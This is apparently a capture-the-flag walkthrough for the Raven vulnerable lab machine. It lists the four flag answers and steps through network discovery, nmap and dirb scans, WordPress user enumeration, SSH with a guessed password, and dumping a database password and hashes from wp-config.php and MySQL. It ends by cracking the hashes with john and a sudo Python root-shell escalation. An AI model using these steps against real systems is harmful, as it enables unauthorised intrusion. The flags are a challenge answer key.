@@ -1,0 +1,81 @@
+flag1{b9bbcb33e11b80be759c4e844862482d} 
+flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+flag3{715dea6c055b9fe3337544932f2941ce}
+flag4{715dea6c055b9fe3337544932f2941ce}
+-----------
+#Use netdiscover on Kali machine to discover devices on network.
+netdiscover > You will see multiple IP Addresses maybe try and put those in the browser.
+
+#One of the IPs will send you to the 'Security Services'
+One the website is flag1{}
+*Hint would be to use the web-inspector
+While using the Inspect Element, you should see a section that says Search HTML
+    an easy way is to type in 'flag' into the search bar.
+        Click on each link and keep searching for 'flag' and sure enough it will appear
+ 
+# Next run a nmap scan against the IP to see what services and information that you can gather.
+nmap -sV -Pn 'x.x.x.x'
+   >I chose to use this scan to run an intensive scan to see if could get more info as well as searching for ports and services
+
+#Next goal is to scan the Website for possible Vulns.
+#You can use dirb or other tools to do so.
+dirb http://x.x.x.x
+
+After running the scan was able to see /wordpress from the website
+You can verify by going to http://x.x.x.x/wordpress > now that you know there is a wordpress site you can run a wordpress scan
+
+# You can run a WordPress scan on a host with WP SCan
+#Scan below is used to scan the wordpress site as well as enumerate any users associated to the site
+wpscan --url http://x.x.x.x/wordpress -eu
+#Two users found: 
+Steven 
+Michael
+>ssh into user accounts 'ssh name@x.x.x.x'
+Could not log into steven or guess the password
+Michael used his name as the password… (Lol not a good idea, way too easy to guess)
+
+## SSH into Michael 
+Michael:
+uname -a:
+Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
+
+cat /etc/issue:  gives OS information
+Debian GNU/Linux 8 \n \l
+
+#We also know that website data is stored in /var
+## go into /var/www and 'ls' and you will find flag2{}
+--
+
+cat /var/www/html/wordpress/wp-config.php
+Contents::
+DB_USER 'root'
+DB_Password 'R@v3nSecurity'
+define('AUTH_KEY',         '0&ItXmn^q2d[e*yB:9,L:rR<B`h+DG,zQ&SN{Or3zalh.JE+Q!Gi:L7U[(T:J5ay'); {**
+define('SECURE_AUTH_KEY',  'y@^[*q{)NKZAKK{,AA4y-Ia*swA6/O@&*r{+RS*N!p1&a$*ctt+ I/!?A/Tip(BG');
+define('LOGGED_IN_KEY',    '.D4}RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&/F7SBSLPlj');
+define('NONCE_KEY',        '4L{Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&46');  In other CTF or senarios the ** could be useful
+define('AUTH_SALT',        '@@?u*YKtt:o/T&V;cbb`.GaJ0./S@dn$t2~n+lR3{PktK]2,*y/b%<BH-Bd#I}oE');
+define('SECURE_AUTH_SALT', 'f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$& mn=]=/cvd');
+define('LOGGED_IN_SALT',   '}STRHqy,4scy7v >-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@');
+define('NONCE_SALT',       'i(#~[sXA TbJJfdn&D;0bd`p$r,~.o/?%m<H+<>Vj+,nLvX!-jjjV-o6*HDh5Td{'); **}
+
+Wordpress = Database
+>search through sql database:
+With root password log-in to msql:
+Findings:
+michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
+steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ 
+
+Also flag3{} is located somewhere in the database.
+
+After getting hashes from MySQL >
+use john to crack hashes.
+
+john ‘path to file’
+john-show ‘path to file’
+>password should print on the screen 
+
+SSH or su as steven with password from john output:
+>sudo -l shows /usr/bin/python
+Goal is to spawn python shell as root:
+	>sudo python -c 'import pty;pty.spawn("/bin/bash")'
